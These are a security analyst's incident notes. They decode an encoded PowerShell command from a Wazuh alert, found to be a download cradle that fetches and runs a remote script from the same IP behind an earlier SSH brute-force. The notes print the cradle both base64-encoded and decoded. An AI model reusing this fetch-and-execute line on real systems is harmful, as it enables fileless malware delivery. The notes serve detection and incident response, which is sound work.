# Analyst Investigation Notes

The triage script flags Incident 4 (source `185.220.101.34`) as CRITICAL based on rule severity alone, but the automated report can't tell you *what the attacker actually did*. That's the manual step: pulling the raw alert data and digging in by hand.

**Alert in question:** `Windows: Suspicious process - powershell.exe with encoded command` (rule level 12), part of Incident 4 in `triage_report.md`.

**Raw `process` field from the alert (`sample_data/wazuh_alerts.json`):**

```
powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMwA0ADoAOAAwADgAMAAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==
```

**Decode steps in CyberChef ([gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/)):**

1. Paste the base64 blob (everything after `-enc`) into the Input pane.
2. PowerShell's `-EncodedCommand` flag encodes the script as UTF-16LE before base64, so a plain "From Base64" alone produces garbled text with null bytes between characters.
3. Build the recipe: **From Base64** → **Decode text** (set to `UTF-16LE (1200)`).
4. Output:

```
IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.34:8080/update.ps1')
```

**Analysis:** This is a classic PowerShell download cradle. `IEX` (`Invoke-Expression`) executes whatever `DownloadString` retrieves, meaning the host reaches out to `185.220.101.34:8080/update.ps1` and runs the response directly in memory, no file ever touches disk. That's worth flagging on its own: fileless execution like this is specifically designed to dodge traditional antivirus, which mostly scans files rather than in-memory script execution.

Two details make this more credible as malicious rather than legitimate admin activity: the destination IP is the **same IP that ran the SSH brute-force against this host minutes earlier** in the same incident, meaning the attacker likely pivoted from a successful login straight into staging a payload; and the URL path `/update.ps1` is a common naming trick to blend in with legitimate software update traffic in an analyst's log review.

**Conclusion:** This alert should not be closed as a false positive. It supports escalating Incident 4 to Tier 2/IR as a confirmed initial-access-to-execution chain: brute-force login → encoded PowerShell download cradle → (pending) outbound callback to attacker infrastructure. Recommended follow-up: check outbound firewall/proxy logs for any connection from `win-client-01` to `185.220.101.34:8080` after `02:16:02Z` to confirm whether the payload actually downloaded and ran.

---

*Kept as a separate file on purpose: `triage.py` regenerates `triage_report.md` from scratch every run, which would wipe out manual notes if they lived inside that file. This file holds the analyst-side work that sits alongside the automated report.*
